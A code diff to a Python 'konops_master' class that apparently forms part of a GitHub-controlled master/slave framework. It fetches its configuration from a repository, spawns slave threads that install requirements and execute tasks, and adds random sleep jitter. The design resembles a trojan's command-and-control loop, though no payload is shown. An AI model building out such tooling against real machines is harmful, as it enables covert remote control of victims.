@@ -9,12 +9,16 @@ import time
 import threading
 import json
 
-from konops import Konops
 from konops_slave import Konops_slave
 
+#configuration path
+cpath="config/"
+#module path
+mpath="modules/"
+#data path
+dpath="data/"
 
-
-class konops_master(Konops):
+class konops_master():
     def __init__(self, master_id):
         super().__init__()
         self.master_id = master_id
@@ -26,7 +30,7 @@ class konops_master(Konops):
         self.token, self.headers = gitwrapper.login()
 
     def configure(self):
-        config_file_path = self.cpath + self.master_config
+        config_file_path = cpath + self.master_config
         response, config_content_json = gitwrapper.get_file_contents(self.token, self.headers, config_file_path)
 
         self.configured = True
@@ -40,17 +44,24 @@ class konops_master(Konops):
         try:
             konopas = Konops_slave(slave_id)
             konopas.install_requirements()
+            print("Konops spawned!")
             konopas.configure()
             konopas.execute()
-        except exception as e:
-            print("Error spawning the konops.\n")
+            
+        except Exception as e:
+            print("Error spawning the konops.\n", e)
 
     def manage_konops_threads(self):
         try:
-            threading.start_new_thread(self.spawn_konops, ("obsv"))
+            k_thread = threading.Thread(target=self.spawn_konops, args=(("obsv",)))
+            k_thread.start()
             self.spawns += 1
         except:
             print("Error starting the thread.\n")
+
+    def sleep(self):
+        sleep_time = random.randint(120, 1000)
+        time.sleep(sleep_time)
 
     def run_master(self):
         while(self.spawns <= self.num_of_threads):
